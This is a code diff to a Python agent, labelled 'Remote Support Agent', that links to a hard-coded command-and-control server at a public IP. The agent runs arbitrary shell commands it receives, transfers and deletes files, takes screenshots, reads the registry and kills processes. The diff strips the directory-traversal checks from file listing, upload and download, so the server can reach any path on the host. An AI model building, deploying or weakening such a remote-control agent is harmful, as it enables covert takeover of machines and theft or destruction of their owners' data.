@@ -11,9 +11,11 @@ import platform
 import subprocess
 import threading
 import time
+import shutil
 from datetime import datetime
 import base64
 from io import BytesIO
+import socket
 
 # Configuration - Server IP will be auto-detected or read from config
 SERVER_URL = "http://102.209.236.22:5000"  # Auto-configured with your public IP
@@ -45,9 +47,6 @@ def detect_server_url():
         return env_url
     
     return SERVER_URL
-
-# Standard library imports
-import socket
 
 HOSTNAME = socket.gethostname()
 
@@ -90,7 +89,6 @@ class RemoteAgent:
         @self.sio.event
         def connect():
             print(f"[AGENT] Connected to C&C server at {self.server_url}")
-            # Register with server
             sys_info = get_system_info()
             self.sio.emit('register_agent', sys_info)
             
@@ -105,13 +103,11 @@ class RemoteAgent:
             
         @self.sio.event
         def execute_command(data):
-            """Execute command from C&C server"""
             command = data.get('command')
             command_id = data.get('command_id')
             print(f"[AGENT] Executing: {command}")
             
             try:
-                # Execute command
                 result = subprocess.run(
                     command,
                     shell=True,
@@ -126,7 +122,6 @@ class RemoteAgent:
                     'return_code': result.returncode,
                     'timestamp': datetime.now().isoformat()
                 }
-                
                 self.sio.emit('command_result', output)
                 
             except subprocess.TimeoutExpired:
@@ -148,25 +143,14 @@ class RemoteAgent:
         
         @self.sio.event
         def list_files(data):
-            """List files in directory"""
             path = data.get('path', '.')
-            # Validate path to prevent directory traversal
-            if '..' in path or path.startswith('/') or ':' in path:
-                self.sio.emit('file_list', {
-                    'path': path,
-                    'error': 'Invalid path: directory traversal not allowed',
-                    'command_id': data.get('command_id')
-                })
-                return
-            # Resolve to safe path within agent's allowed directory
-            safe_path_resolved = os.path.abspath(path)
-            print(f"[AGENT] Listing files: {safe_path_resolved}")
+            print(f"[AGENT] Listing files: {path}")
             
             try:
                 entries = []
-                if not os.path.exists(safe_path_resolved):
-                    raise FileNotFoundError(f"Path does not exist: {safe_path_resolved}")
-                for item in sorted(os.listdir(safe_path_resolved)):
+                if not os.path.exists(path):
+                    raise FileNotFoundError(f"Path does not exist: {path}")
+                for item in sorted(os.listdir(path)):
                     full_path = os.path.join(path, item)
                     try:
                         stat = os.stat(full_path)
@@ -194,7 +178,6 @@ class RemoteAgent:
         
         @self.sio.event
         def upload_file(data):
-            """Upload file to agent"""
             filename = data.get('filename')
             content_b64 = data.get('content')
             remote_path = data.get('path', '.')
@@ -202,14 +185,9 @@ class RemoteAgent:
             print(f"[AGENT] Uploading file: {filename} to {remote_path}")
             
             try:
-                # Validate path to prevent directory traversal
-                if '..' in remote_path or '..' in filename or ':' in remote_path:
-                    raise ValueError("Invalid path: directory traversal not allowed")
-                
                 file_data = base64.b64decode(content_b64)
-                # Sanitize filename - remove any path separators
                 safe_filename = os.path.basename(filename)
-                full_path = os.path.abspath(os.path.join(remote_path, safe_filename))
+                full_path = os.path.join(remote_path, safe_filename)
                 
                 with open(full_path, 'wb') as f:
                     f.write(file_data)
@@ -230,17 +208,11 @@ class RemoteAgent:
         
         @self.sio.event
         def download_file(data):
-            """Download file from agent"""
             file_path = data.get('path')
             print(f"[AGENT] Downloading file: {file_path}")
             
             try:
-                # Validate path to prevent directory traversal
-                if '..' in file_path or file_path.startswith('/') or ':' in file_path:
-                    raise ValueError("Invalid path: directory traversal not allowed")
-                safe_file_path = os.path.abspath(file_path)
-                
-                with open(safe_file_path, 'rb') as f:
+                with open(file_path, 'rb') as f:
                     content = f.read()
                 
                 content_b64 = base64.b64encode(content).decode('utf-8')
@@ -262,13 +234,11 @@ class RemoteAgent:
         
         @self.sio.event
         def delete_file(data):
-            """Delete file or directory"""
             file_path = data.get('path')
             print(f"[AGENT] Deleting: {file_path}")
             
             try:
                 if os.path.isdir(file_path):
-                    import shutil
                     shutil.rmtree(file_path)
                 else:
                     os.remove(file_path)
@@ -287,11 +257,9 @@ class RemoteAgent:
         
         @self.sio.event
         def screenshot(data):
-            """Take screenshot"""
             print(f"[AGENT] Taking screenshot...")
             
             try:
-                # Try to use PIL/Pillow if available
                 try:
                     from PIL import ImageGrab
                     img = ImageGrab.grab()
@@ -306,28 +274,11 @@ class RemoteAgent:
                         'command_id': data.get('command_id')
                     })
                 except ImportError:
-                    # Try mss as fallback
-                    try:
-                        import mss
-                        from PIL import Image
-                        with mss.mss() as sct:
-                            img = sct.grab(sct.monitors[1])
-                            buffered = BytesIO()
-                            Image.frombytes('RGB', img.size, img.rgb).save(buffered, format="PNG")
-                            content_b64 = base64.b64encode(buffered.getvalue()).decode('utf-8')
-                            
-                            self.sio.emit('screenshot_result', {
-                                'status': 'success',
-                                'content': content_b64,
-                                'format': 'png',
-                                'command_id': data.get('command_id')
-                            })
-                    except:
-                        self.sio.emit('screenshot_result', {
-                            'status': 'error',
-                            'error': 'PIL/Pillow not installed',
-                            'command_id': data.get('command_id')
-                        })
+                    self.sio.emit('screenshot_result', {
+                        'status': 'error',
+                        'error': 'PIL/Pillow not installed',
+                        'command_id': data.get('command_id')
+                    })
             except Exception as e:
                 self.sio.emit('screenshot_result', {
                     'status': 'error',
@@ -337,7 +288,6 @@ class RemoteAgent:
         
         @self.sio.event
         def read_registry(data):
-            """Read Windows registry"""
             print(f"[AGENT] Reading registry: {data.get('hive')}\\{data.get('key_path')}")
             
             try:
@@ -368,21 +318,23 @@ class RemoteAgent:
         
         @self.sio.event
         def list_processes(data):
-            """List running processes"""
             print(f"[AGENT] Listing processes...")
             
             try:
                 processes = []
                 if platform.system() == 'Windows':
-                    import wmi
-                    c = wmi.WMI()
-                    for proc in c.Win32_Process():
-                        processes.append({
-                            'pid': proc.ProcessId,
-                            'name': proc.Name,
-                            'cpu': 0,  # WMI CPU requires separate query
-                            'memory': getattr(proc, 'WorkingSetSize', 0) // 1024 // 1024  # MB
-                        })
+                    try:
+                        import wmi
+                        c = wmi.WMI()
+                        for proc in c.Win32_Process():
+                            processes.append({
+                                'pid': proc.ProcessId,
+                                'name': proc.Name,
+                                'cpu': 0,
+                                'memory': getattr(proc, 'WorkingSetSize', 0) // 1024 // 1024
+                            })
+                    except ImportError:
+                        pass
                 else:
                     result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
                     for line in result.stdout.split('\n')[1:]:
@@ -397,7 +349,7 @@ class RemoteAgent:
                 
                 self.sio.emit('processes_result', {
                     'status': 'success',
-                    'processes': processes[:100],  # Limit to 100
+                    'processes': processes[:100],
                     'command_id': data.get('command_id')
                 })
             except Exception as e:
@@ -409,7 +361,6 @@ class RemoteAgent:
         
         @self.sio.event
         def kill_process(data):
-            """Kill process by PID"""
             pid = data.get('pid')
             print(f"[AGENT] Killing process PID: {pid}")
             
@@ -433,22 +384,16 @@ class RemoteAgent:
         
         @self.sio.event
         def wake_on_lan(data):
-            """Send Wake-on-LAN packet"""
             mac_address = data.get('mac_address')
             print(f"[AGENT] Sending WoL to: {mac_address}")
             
             try:
-                # Parse MAC address
                 mac = mac_address.replace(':', '').replace('-', '')
                 if len(mac) != 12:
                     raise ValueError("Invalid MAC address format")
                 
-                # Create magic packet: 6 bytes of 0xFF followed by 16 repetitions of MAC address
-                # 'FF' repeated 6 times = 12 hex chars for sync stream
-                # MAC address repeated 16 times for target
                 packet = bytes.fromhex('FF' * 6 + mac * 16)
                 
-                # Send packet
                 with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                     sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
                     sock.sendto(packet, ('<broadcast>', 9))
@@ -466,12 +411,10 @@ class RemoteAgent:
                 })
                 
     def connect(self):
-        """Connect to C&C server with auto-reconnect"""
         while True:
             try:
                 if not self.sio.connected:
                     self.sio.connect(self.server_url, transports=['websocket', 'polling'])
-                    # Keep alive
                     while self.sio.connected:
                         time.sleep(30)
                         self.sio.emit('heartbeat', {'agent_id': self.agent_id})
@@ -480,7 +423,6 @@ class RemoteAgent:
                 time.sleep(10)
     
     def run(self):
-        """Start the agent"""
         print(f"[AGENT] Starting Remote Support Agent...")
         print(f"[AGENT] Hostname: {HOSTNAME}")
         print(f"[AGENT] Local IP: {get_local_ip()}")
